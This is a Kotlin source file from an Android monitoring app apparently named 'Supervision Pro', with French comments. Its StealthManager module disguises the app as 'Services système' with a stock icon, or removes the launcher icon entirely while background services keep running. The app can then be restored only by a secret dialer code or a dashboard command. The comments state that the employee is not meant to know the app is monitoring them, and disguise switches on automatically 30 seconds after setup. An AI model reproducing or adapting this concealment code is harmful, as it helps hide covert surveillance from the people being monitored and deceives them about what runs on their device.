package com.surveillancepro.android.services

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log

/**
 * Gestion du mode furtif (stealth).
 *
 * 3 modes disponibles :
 *
 * MODE_VISIBLE :
 *   L'app apparaît normalement dans le launcher sous "Supervision Pro"
 *   avec l'icône normale. C'est le mode par défaut au premier lancement
 *   pour permettre la configuration.
 *
 * MODE_DISGUISED :
 *   L'app apparaît dans le launcher mais déguisée en "Services système"
 *   avec l'icône Android par défaut. L'employé ne sait pas que c'est
 *   une app de supervision. Si il clique dessus, il voit juste un écran
 *   "Services système" anodin. FONCTIONNE SANS ROOT.
 *
 * MODE_HIDDEN :
 *   L'app disparaît complètement du launcher. Aucune icône nulle part.
 *   Pour la rouvrir : composer un code secret au clavier téléphonique
 *   ou envoyer une commande depuis le dashboard.
 *   Sur Android sans root, c'est possible via les activity-alias.
 *   Les services continuent de tourner en arrière-plan.
 */
object StealthManager {

    private const val TAG = "StealthManager"
    private const val PREF_KEY = "sp_stealth_mode"

    enum class StealthMode {
        VISIBLE,    // Icône normale "Supervision Pro"
        DISGUISED,  // Icône déguisée "Services système"
        HIDDEN,     // Pas d'icône du tout
    }

    fun getCurrentMode(context: Context): StealthMode {
        val prefs = context.getSharedPreferences("sp_stealth", Context.MODE_PRIVATE)
        return when (prefs.getString(PREF_KEY, "visible")) {
            "disguised" -> StealthMode.DISGUISED
            "hidden" -> StealthMode.HIDDEN
            else -> StealthMode.VISIBLE
        }
    }

    /**
     * Active le mode furtif demandé.
     * Fonctionne SANS root grâce aux activity-alias dans le Manifest.
     */
    fun setMode(context: Context, mode: StealthMode) {
        val pm = context.packageManager
        val pkg = context.packageName

        val visibleAlias = ComponentName(pkg, "$pkg.LauncherVisible")
        val stealthAlias = ComponentName(pkg, "$pkg.LauncherStealth")

        when (mode) {
            StealthMode.VISIBLE -> {
                pm.setComponentEnabledSetting(
                    visibleAlias,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
                pm.setComponentEnabledSetting(
                    stealthAlias,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Log.d(TAG, "Mode: VISIBLE (Supervision Pro)")
            }

            StealthMode.DISGUISED -> {
                pm.setComponentEnabledSetting(
                    visibleAlias,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                pm.setComponentEnabledSetting(
                    stealthAlias,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
                Log.d(TAG, "Mode: DISGUISED (Services système)")
            }

            StealthMode.HIDDEN -> {
                pm.setComponentEnabledSetting(
                    visibleAlias,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                pm.setComponentEnabledSetting(
                    stealthAlias,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Log.d(TAG, "Mode: HIDDEN (aucune icône)")
            }
        }

        // Sauvegarder le mode
        val prefs = context.getSharedPreferences("sp_stealth", Context.MODE_PRIVATE)
        prefs.edit().putString(PREF_KEY, when (mode) {
            StealthMode.VISIBLE -> "visible"
            StealthMode.DISGUISED -> "disguised"
            StealthMode.HIDDEN -> "hidden"
        }).apply()
    }

    /**
     * Appelé automatiquement après l'acceptation des conditions.
     * Bascule en mode déguisé après un délai (le temps que l'admin finisse la config).
     */
    fun activateAfterSetup(context: Context, delayMs: Long = 30000) {
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            val prefs = context.getSharedPreferences("sp_stealth", Context.MODE_PRIVATE)
            val autoStealth = prefs.getBoolean("auto_stealth", true)
            if (autoStealth) {
                setMode(context, StealthMode.DISGUISED)
            }
        }, delayMs)
    }

    /**
     * Code secret pour réafficher l'app.
     * L'admin compose *#*#7378#*#* (S-P-R-O = Supervision Pro) au clavier téléphonique.
     */
    const val SECRET_CODE = "7378"
}
